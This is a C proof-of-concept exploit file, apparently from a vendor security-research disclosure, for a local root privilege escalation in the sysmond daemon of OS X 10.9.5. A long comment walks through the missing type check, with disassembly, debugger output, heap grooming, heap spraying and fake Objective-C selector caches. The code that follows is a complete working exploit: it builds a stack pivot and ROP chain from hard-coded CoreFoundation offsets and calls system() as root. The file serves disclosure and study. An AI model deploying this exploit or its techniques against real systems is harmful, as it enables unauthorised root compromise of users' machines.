/*
  Source: https://code.google.com/p/google-security-research/issues/detail?id=121
*/

/*
  tested on OS X 10.9.5 - uses some hard-coded offsets which will have to be fixed-up for other versions!

  this poc uses liblorgnette to resolve some private symbols; grab the code from github:
  git clone https://github.com/rodionovd/liblorgnette.git

  build this PoC with:
  clang -o sysmond_exploit_writeup sysmond_exploit_writeup.c liblorgnette/lorgnette.c -framework CoreFoundation

  sysmond is a daemon running as root. You can interact with sysmond via XPC ("com.apple.sysmond".)

  sub_100001AAF calls sub_100003120 passing the xpc dictionary received from the attacker. This function
  allocates a sysmond_request object and fills in fields from the attacker-controlled xpc request dictionary:

  ;read a uint64 with the key "Type"
__text:0000000100003144                 mov     rax, cs:_SYSMON_XPC_KEY_TYPE_ptr
__text:000000010000314B                 mov     rsi, [rax]
__text:000000010000314E                 mov     rdi, r14
__text:0000000100003151                 call    _xpc_dictionary_get_uint64
__text:0000000100003156                 mov     [rbx+20h], rax                ;rbx points to sysmond_request

  ;read anything with the key "Attributes"
__text:000000010000315A                 mov     rax, cs:_SYSMON_XPC_KEY_ATTRIBUTES_ptr
__text:0000000100003161                 mov     rsi, [rax]
__text:0000000100003164                 mov     rdi, r14
__text:0000000100003167                 call    _xpc_dictionary_get_value
__text:000000010000316C                 mov     [rbx+28h], rax
... continues parsing more fields

  The sysmond_request is returned from this function and passed as the first argument to sub_10000337D:

__text:000000010000337D sub_10000337D   proc near               ; CODE XREF: sub_100001AAF+4Bp
__text:000000010000337D
__text:000000010000337D var_38          = qword ptr -38h
__text:000000010000337D var_30          = dword ptr -30h
__text:000000010000337D var_2C          = dword ptr -2Ch
__text:000000010000337D var_28          = qword ptr -28h
__text:000000010000337D var_20          = qword ptr -20h
__text:000000010000337D var_18          = qword ptr -18h
__text:000000010000337D
__text:000000010000337D                 push    rbp
__text:000000010000337E                 mov     rbp, rsp
__text:0000000100003381                 push    r14
__text:0000000100003383                 push    rbx
__text:0000000100003384                 sub     rsp, 30h
__text:0000000100003388                 mov     rbx, rdi          ; sysmond_request pointer
__text:000000010000338B                 mov     rdi, [rbx+20h]    ; "Type" uint64 value in the xpc request dictionary
__text:000000010000338F                 mov     rsi, [rbx+28h]    ; "Attributes" value in the xpc request dictionary
__text:0000000100003393                 call    sub_100003454

  this function extracts the Type and Attribute values and passes them to sub_100003454:

__text:0000000100003454 sub_100003454 proc near   ; CODE XREF: sub_10000337D+16p
__text:0000000100003454                           ; handler+C0 p
__text:0000000100003454                 push    rbp
__text:0000000100003455                 mov     rbp, rsp
__text:0000000100003458                 push    r15
__text:000000010000345A                 push    r14
__text:000000010000345C                 push    r12
__text:000000010000345E                 push    rbx
__text:000000010000345F                 mov     r12, rsi          ; this is "Attributes" value
__text:0000000100003462                 mov     r14, rdi          ; which was read from the dictionary with xpc_dictionary_get_value
__text:0000000100003465                 mov     rdi, r12          ; meaning it could be any xpc type
__text:0000000100003468                 call    _xpc_data_get_length   ; use "Attributes" value as an xpc_data object
__text:000000010000346D                 mov     r15, rax
__text:0000000100003470                 mov     rdi, r15        ; size_t
__text:0000000100003473                 call    _malloc
__text:0000000100003478                 mov     rbx, rax
__text:000000010000347B                 mov     rdi, r12
__text:000000010000347E                 mov     rsi, rbx
__text:0000000100003481                 xor     edx, edx
__text:0000000100003483                 mov     rcx, r15
__text:0000000100003486                 call    _xpc_data_get_bytes ; use "Attributes" value again interpreted as an xpc_data

  the xpc_data_get_bytes call is the interesting one:

__text:00000000000114BE _xpc_data_get_bytes proc near
__text:00000000000114BE                 push    rbp
__text:00000000000114BF                 mov     rbp, rsp
...
__text:00000000000114D2                 mov     r14, rsi
__text:00000000000114D5                 mov     r13, rdi
__text:00000000000114D8                 cmp     qword ptr [r13+28h], 0FFFFFFFFFFFFFFFFh
__text:00000000000114DD                 jnz     short loc_11515
...
__text:0000000000011515                 lea     rdi, [r13+28h]  ; predicate
__text:0000000000011519                 lea     rdx, __xpc_data_map_once ; function
__text:0000000000011520                 mov     rsi, r13        ; context
__text:0000000000011523                 call    _dispatch_once_f

  here, if the value at +28h isn't -1 then our xpc object will be passed as the context to __xpc_data_map_once:

__text:00000000000028E9 __xpc_data_map_once proc near           ; DATA XREF: _xpc_data_get_bytes_ptr+1Fo
__text:00000000000028E9                                         ; __xpc_data_equal+46ao ...
__text:00000000000028E9                 push    rbp
__text:00000000000028EA                 mov     rbp, rsp
__text:00000000000028ED                 push    r14
__text:00000000000028EF                 push    rbx
__text:00000000000028F0                 mov     rbx, rdi                   ; controlled xpc object
__text:00000000000028F3                 cmp     byte ptr [rbx+48h], 0      ; if the byte at +48h is 0
__text:00000000000028F7                 jnz     short loc_291E
__text:00000000000028F9                 mov     rdi, [rbx+30h]             ; then pass the pointer at +30h
__text:00000000000028FD                 lea     rsi, [rbx+38h]
__text:0000000000002901                 lea     rdx, [rbx+40h]
__text:0000000000002905                 call    _dispatch_data_create_map  ; to dispatch_data_create_map
__text:000000000000290A                 mov     r14, rax
__text:000000000000290D                 mov     rdi, [rbx+30h]  ; object
__text:0000000000002911                 call    _dispatch_release          ; and then to dispatch_release

  we can return early from dispatch_data_create_map by setting the value at +28h from the pointer passed as the first arg to 0:

__text:00000000000012B6 _dispatch_data_create_map proc near     ; CODE XREF: __dispatch_data_subrange_map+34p
__text:00000000000012B6                                         ; __dispatch_operation_perform+DEap
__text:00000000000012B6
__text:00000000000012B6                 push    rbp
__text:00000000000012B7                 mov     rbp, rsp
__text:00000000000012BA                 push    r15
__text:00000000000012BC                 push    r14
__text:00000000000012BE                 push    r13
__text:00000000000012C0                 push    r12
__text:00000000000012C2                 push    rbx
__text:00000000000012C3                 sub     rsp, 38h
__text:00000000000012C7                 mov     [rbp+var_58], rdx
__text:00000000000012CB                 mov     r15, rsi
__text:00000000000012CE                 mov     r14, rdi
__text:00000000000012D1                 mov     r12, [r14+28h]          ; if this is 0
__text:00000000000012D5                 test    r12, r12
__text:00000000000012D8                 jz      short loc_131C          ; jumps to early return without disturbing anything else

  we then reach the call to dispatch_release which is passing the pointer at +30h of the xpc object we control (the API believes this is an xpc_data object)
  this ends up calling _dispatch_objc_release which sends the objective c "release" message to the object.

  We'll come back to how to get code code execution from that later.

  The crux of the bug is that the value of the "Attributes" key in the request dictionary is never validated to actually be an xpc_data object and the gets
  passed to functions expecting an xpc_data. In order to exploit this we need to have a value of a type other than xpc_data as the "Attributes" value
  in the request dictionary - specifically one where the offsets outlined above have suitably controlled values:

  +28h qword 0
  +30h pointer to controlled data
  +48h byte 0

  the xpc_uuid type comes the closest to fulfilling these requirements. We completely control the 16 bytes from +28h so the first two constraints are easily
  satisfied. Heap spraying is very reliable and fast in xpc, we can easily map a gigabyte of data into sysmond at a predicable address so we can point the
  pointer at +30h to that.

  The xpc_uuid object is only 40h bytes though, so we have no control over the byte at +48h which must be 0...

  OS X uses magazine malloc which is a heap-based allocator. It has three broad size classes (x<1k = tiny; 1k<x<15k = small; x>15k = large) and within these
  it will allocate approximately contiguously (using size-based free-lists to speed things up) with no inline-metadata which means there's a
  reasonable expectation that sequential allocations of similar sizes will be contiguous.

  Our xpc_uuid object is allocated when the request dictionary is received, so what's the next thing which is allocated?
  xpc_dictionaries have 6 hash buckets which store the heads of linked-lists for each bucket. As the dictionary is being deserialized first the value of a
  key is deserialized (allocating in this case the xpc_uuid) object then the entry is added to the linked-list (allocting a new linked-list entry struct.)

  The structure of a linked-list entry is approximately:

  struct ll {
    struct ll* forward;
    struct ll* backward;
    xpc_object_t* object;
    uint64_t flags;
    char key[0];
  }

  This is a variable-size struct - the key is allocated inline. If the xpc_uuid is immediately followed in memory by its linked-list entry the the value at +48
  will be the least-significant byte of the backward linked-list pointer. Our only requirement is that this byte be 0, which is easily achieved by ensuring that
  the previous linked-list entry struct in the list (which this linked-list entry points to) was allocated with an alignment of at least 256 bytes.
  The magazine malloc "small" size class heap chunks all have an alignment
  of 512 bytes meaning that we just need the linked-list entry prior to the xpc_uuid to be between 1k and 15k. In order for the key to end up in the right linked-list
  when it's deserialized we also need to make sure that the long key hashes to the same hash as "Attributes" - since there are only 6 possible hash values this is trivial.

  Finally, we can add another xpc_data object to the reqest dictionary with a gigabyte of heapspray as the value - this will be mapped into sysmond at a suitably
  predictable address meaning we can set the high 8 bytes of the uuid value to point to this.

  At this point we control a pointer to an objective-c object and the code will call objc_msgSend to "send a message" to our controlled object, which is the
  objective-c paradigm for calling methods. Let's look at the implementation of this to see how we can turn that into instruction pointer control:

__text:000000000000117F __dispatch_objc_release proc near       ; CODE XREF: _dispatch_release:loc_117Aj
__text:000000000000117F                                         ; _dispatch_data_create_subrange+183_p ...
__text:000000000000117F                 mov     rax, rdi
__text:0000000000001182                 cmp     cs:__os_object_have_gc, 0
__text:0000000000001189                 jnz     short loc_119E
__text:000000000000118B                 mov     rcx, cs:msgRef_release__objc_msgSend_fixup
__text:0000000000001192                 lea     rsi, msgRef_release__objc_msgSend_fixup
__text:0000000000001199                 mov     rdi, rax
__text:000000000000119C                 jmp     rcx


  rdi points to our heap sprayed fake objective-c object. This code sets rsi to point to the msgRef_release__objc_msgSend_fixup structure then calls the value at that address
  which is objc_msgSend_fixup. msgRef_release__objc_msgSend_fixup is in the __objc_msgrefs section of the data segment and in lldb we can see that at runtime is has the following
  contents:

  { /usr/lib/libobjc.A.dylib`objc_msgSend_fixedup, "release" }

  and the implementation of objc_msgSend_fixedup is:

(lldb) disassemble --name objc_msgSend_fixedup
libobjc.A.dylib`objc_msgSend_fixedup:
   0x7fff91d5d1c4:  mov    RSI, QWORD PTR [RSI + 8]
   0x7fff91d5d1c8:  jmpq   0x7fff91d5d080            ; objc_msgSend

  which just calls through to objc_msgSend passing the address of the "release" string as the second argument:

(lldb) disassemble --name objc_msgSend
libobjc.A.dylib`objc_msgSend:
   0x7fff91d5d080:  test   RDI, RDI
   0x7fff91d5d083:  je     0x7fff91d5d0f8
   0x7fff91d5d086:  test   DIL, 1
   0x7fff91d5d08a:  jne    0x7fff91d5d10f
   0x7fff91d5d091:  mov    R11, QWORD PTR [RDI]         ; rdi points to controlled fake objective-c object - read pointer to objective-c class
   0x7fff91d5d094:  mov    R10, RSI                     ; copy selector (pointer to string of method to call) to r10
   0x7fff91d5d097:  and    R10D, DWORD PTR [R11 + 24]   ; mask off n upper bits of the pointer according to value of fake_class+18h
   0x7fff91d5d09b:  shl    R10, 4                       ;
   0x7fff91d5d09f:  add    R10, QWORD PTR [R11 + 16]    ; use that masked off value as an index into a cache array pointed to by fake_class+10h
   0x7fff91d5d0a3:  cmp    RSI, QWORD PTR [R10]         ; does the cache entry selector match the selector passed as the second arg?
   0x7fff91d5d0a6:  jne    0x7fff91d5d0ac
   0x7fff91d5d0a8:  jmp    QWORD PTR [R10 + 8]          ; if so, then call the cached function implementation address

  Objective-c classses cache the addresses of the selector strings, not the contents of the strings so in order to exploit this we need to be able
  to find the address of the "release" selector passed by _dispatch_objc_release so we can construct a fake selector cache.
  All these libraries are loaded at the same address in all processes so we can just find the selector address in this process and it'll be valid for sysmond.

  Having done this we get instruction pointer control. At this point rax and rdi point to the heap spray so this PoC uses a pivot gadget in CoreFoundation
  to move the stack to point into the heap spray and ROP to a system() call with controlled string :)
*/


#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/task.h>

#include <mach-o/dyld_images.h>

#include "liblorgnette/lorgnette.h"

/* find the base address of CoreFoundation for the ROP gadgets */

void* find_library_load_address(const char* library_name){
  kern_return_t err;

  // get the list of all loaded modules from dyld
  // the task_info mach API will get the address of the dyld all_image_info struct for the given task
  // from which we can get the names and load addresses of all modules
  task_dyld_info_data_t task_dyld_info;
  mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
  err = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count);

  const struct dyld_all_image_infos* all_image_infos = (const struct dyld_all_image_infos*)task_dyld_info.all_image_info_addr;
  const struct dyld_image_info* image_infos = all_image_infos->infoArray;
  
  for(size_t i = 0; i < all_image_infos->infoArrayCount; i++){
    const char* image_name = image_infos[i].imageFilePath;
    mach_vm_address_t image_load_address = (mach_vm_address_t)image_infos[i].imageLoadAddress;
    if (strstr(image_name, library_name)){
      return (void*)image_load_address;
    }
  }
  return NULL;
}


struct heap_spray {
  void* fake_objc_class_ptr; // -------+
  uint8_t pad0[0x10];        //        |
  uint64_t first_gadget;     //        |
  uint8_t pad1[0x8];         //        |
  uint64_t null0;            //        |
  uint64_t pad3;             //        |
  uint64_t pop_rdi_rbp_ret;  //        |
  uint64_t rdi;              //        |
  uint64_t rbp;              //        |
  uint64_t system;           //        |
  struct fake_objc_class_t { //        |
    char pad[0x10];      // <----------+
    void* cache_buckets_ptr; //--------+
    uint64_t cache_bucket_mask;  //    |
  } fake_objc_class;             //    |
  struct fake_cache_bucket_t {   //    |
    void* cached_sel;      // <--------+  //point to the right selector
    void* cached_function; // will be RIP :)
  } fake_cache_bucket;
  char command[256];
};


int main(){
  // create the XPC connection to sysmond
  xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.sysmond", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
    xpc_type_t t = xpc_get_type(event);
    if (t == XPC_TYPE_ERROR){
      printf("err: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
    }
    printf("received an event\n");
  });
  xpc_connection_resume(conn);

  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);



  void* heap_spray_target_addr = (void*)0x120202000;
  struct heap_spray* hs = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
  memset(hs, 'C', 0x1000);
  hs->null0 = 0;
  hs->fake_objc_class_ptr = &hs->fake_objc_class;
  hs->fake_objc_class.cache_buckets_ptr = &hs->fake_cache_bucket;
  hs->fake_objc_class.cache_bucket_mask = 0;

  // nasty hack to find the correct selector address :)
  uint8_t* ptr = (uint8_t*)lorgnette_lookup(mach_task_self(), "_dispatch_objc_release");
  uint64_t* msgrefs = ptr + 0x1a + (*(int32_t*)(ptr+0x16)); //offset of rip-relative offset of selector 
  uint64_t sel = msgrefs[1];
  printf("%p\n", sel);
  hs->fake_cache_bucket.cached_sel = sel;

  uint8_t* CoreFoundation_base = find_library_load_address("CoreFoundation");
  // pivot:
/*
push rax
add eax, [rax]
add [rbx+0x41], bl
pop rsp
pop r14
pop r15
pop rbp
ret
*/
  hs->fake_cache_bucket.cached_function = CoreFoundation_base + 0x46ef0; //0x414142424343; // ROP from here

  // jump over the NULL then so there's more space:
  //pop, pop, pop, ret: //and keep stack correctly aligned
  hs->first_gadget = CoreFoundation_base + 0x46ef7;

  hs->pop_rdi_rbp_ret = CoreFoundation_base + 0x2226;
  hs->system = dlsym(RTLD_DEFAULT, "system");

  hs->rdi = &hs->command;
  strcpy(hs->command, "touch /tmp/hello_root");


  size_t heap_spray_pages = 0x40000;
  size_t heap_spray_bytes = heap_spray_pages * 0x1000;
  char* heap_spray_copies = malloc(heap_spray_bytes);
  for (int i = 0; i < heap_spray_pages; i++){
    memcpy(heap_spray_copies+(i*0x1000), hs, 0x1000);
  }

  xpc_dictionary_set_data(msg, "heap_spray", heap_spray_copies, heap_spray_bytes);

  xpc_dictionary_set_uint64(msg, "Type", 1);

  xpc_dictionary_set_uint64(msg, "Interval", 0);
  
  xpc_connection_t xc = xpc_connection_create(NULL, NULL);
  xpc_dictionary_set_connection(msg, "Connection", xc);
 
  // this has the same xpc dictionary hash as "Attributes"
  char* long_key = malloc(1024);
  memset(long_key, 'A', 1023);
  long_key[1023] = '\x00';

  xpc_dictionary_set_string(msg, long_key, "something or other that's not important");
  
  uint64_t uuid[] = {0, 0x120202000};
  xpc_dictionary_set_uuid(msg, "Attributes", (const unsigned char*)uuid);

  xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);

  printf("send and received\n");
  
  xpc_release(msg);
  return 0;
  for(;;){
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, DBL_MAX, TRUE);
  }
  return 0;
}